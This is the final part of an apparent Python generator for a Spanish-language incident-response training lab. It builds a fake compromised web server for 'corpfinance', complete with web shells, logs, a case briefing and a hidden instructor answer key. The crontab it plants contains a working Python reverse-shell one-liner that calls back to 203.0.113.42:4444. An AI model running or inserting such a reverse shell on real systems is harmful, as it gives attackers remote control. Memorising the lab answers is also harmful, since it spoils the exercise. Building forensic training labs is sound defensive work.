ServerRoot "/etc/apache2"
ServerName webserver.corpfinance.local
ServerAdmin admin@corpfinance.local
Listen 80
Listen 443

<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>

# Security headers
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"

# Logging
ErrorLog /var/log/apache2/error.log
CustomLog /var/log/apache2/access.log combined
LogLevel warn
""")
    
    # Crontab sospechoso
    with open(f"{SERVER_ROOT}/var/spool/cron/www-data", "w") as f:
        f.write("""# Cache warming - runs every 5 minutes
*/5 * * * * php /var/www/html/cache/cache_manager.php --warm 2>/dev/null
# Log rotation
0 0 * * * /usr/sbin/logrotate /etc/logrotate.d/apache2
# Suspicious: reverse shell callback every 6 hours (added by attacker)
0 */6 * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("203.0.113.42",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' 2>/dev/null
""")


def generate_investigation_context():
    """Genera el contexto de la investigación para el analista."""
    
    context = {
        "case_id": "IR-2026-0712-002",
        "case_name": "Web Shell Compromise - webserver.corpfinance.local",
        "server": {
            "hostname": "webserver.corpfinance.local",
            "os": "Ubuntu 22.04 LTS",
            "ip": "10.50.25.50",
            "services": ["Apache 2.4.52", "PHP 8.1.2", "MySQL 8.0"],
            "role": "Servidor web corporativo principal"
        },
        "initial_alert": {
            "source": "Palo Alto NGFW",
            "description": "Outbound connection to known C2 IP from web server",
            "timestamp": "2026-07-14T14:22:00Z",
            "attacker_ip": ATTACKER_IP
        },
        "scope": {
            "web_shells_suspected": 4,
            "persistence_mechanisms": ["web shells", "crontab", "modified .htaccess"],
            "data_at_risk": "Customer financial data, internal documents"
        },
        "collection": {
            "method": "Full disk image + live memory capture",
            "tool": "dc3dd + LiME",
            "timestamp": "2026-07-14T18:00:00Z"
        }
    }
    
    with open(f"/investigation/case_context.json", "w") as f:
        json.dump(context, f, indent=2)
    
    # Briefing legible
    with open(f"/investigation/CASO_BRIEFING.txt", "w") as f:
        f.write("=" * 78 + "\n")
        f.write("  CASO: IR-2026-0712-002 — Web Shells en webserver.corpfinance.local\n")
        f.write("=" * 78 + "\n\n")
        f.write(f"  Servidor:     webserver.corpfinance.local (10.50.25.50)\n")
        f.write(f"  OS:           Ubuntu 22.04 LTS\n")
        f.write(f"  Servicios:    Apache 2.4.52 + PHP 8.1.2 + MySQL 8.0\n")
        f.write(f"  Rol:          Servidor web corporativo principal\n\n")
        f.write(f"  ALERTA INICIAL:\n")
        f.write(f"  Palo Alto NGFW detectó conexión saliente a IP C2 conocida\n")
        f.write(f"  desde el servidor web. IP atacante: {ATTACKER_IP}\n\n")
        f.write(f"  OBJETIVO:\n")
        f.write(f"  Identificar las 4 web shells sospechadas, rastrear al atacante\n")
        f.write(f"  y determinar el alcance de la intrusión.\n\n")
        f.write(f"  EVIDENCIA DISPONIBLE:\n")
        f.write(f"  /evidence/server-image/var/www/html/  → Webroot del servidor\n")
        f.write(f"  /evidence/server-image/var/log/       → Logs del servidor\n")
        f.write(f"  /evidence/server-image/etc/           → Configuración\n")
        f.write("=" * 78 + "\n")


def generate_webshell_answers():
    """Genera archivo con las respuestas (solo para el instructor)."""
    
    shells = []
    shells.append(inject_webshell_1_china_chopper())
    shells.append(inject_webshell_2_obfuscated())
    shells.append(inject_webshell_3_disguised())
    shells.append(inject_webshell_4_advanced())
    
    # Guardar respuestas en ubicación oculta
    answers_dir = "/opt/lab20/.instructor"
    os.makedirs(answers_dir, exist_ok=True)
    
    with open(f"{answers_dir}/webshell_answers.json", "w") as f:
        json.dump(shells, f, indent=2)
    
    return shells


# ─── MAIN ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("[*] Generando servidor web comprometido para Lab 20...")
    print(f"[*] Caso: IR-2026-0712-002 | Server: webserver.corpfinance.local")
    print()
    
    create_directories()
    print("[+] Estructura de directorios creada")
    
    create_legitimate_website()
    print("[+] Sitio web corporativo legítimo desplegado")
    
    shells = generate_webshell_answers()
    print(f"[+] {len(shells)} web shells inyectadas:")
    for i, shell in enumerate(shells, 1):
        print(f"    Shell {i}: {shell['name']} ({shell['location']})")
        print(f"             Dificultad: {shell['detection_difficulty']}")
    
    generate_apache_logs()
    print("[+] Logs de Apache generados (tráfico legítimo + actividad atacante)")
    
    generate_server_config()
    print("[+] Configuración del servidor generada")
    
    generate_investigation_context()
    print("[+] Contexto de investigación generado")
    
    print()
    print("=" * 70)
    print("  SERVIDOR COMPROMETIDO LISTO PARA INVESTIGACIÓN")
    print("=" * 70)
    print(f"  Webroot:  /evidence/server-image/var/www/html/")
    print(f"  Logs:     /evidence/server-image/var/log/apache2/")
    print(f"  Config:   /evidence/server-image/etc/apache2/")
    print(f"  Tools:    /investigation/tools/")
    print(f"  YARA:     /investigation/yara-rules/")
    print("=" * 70)
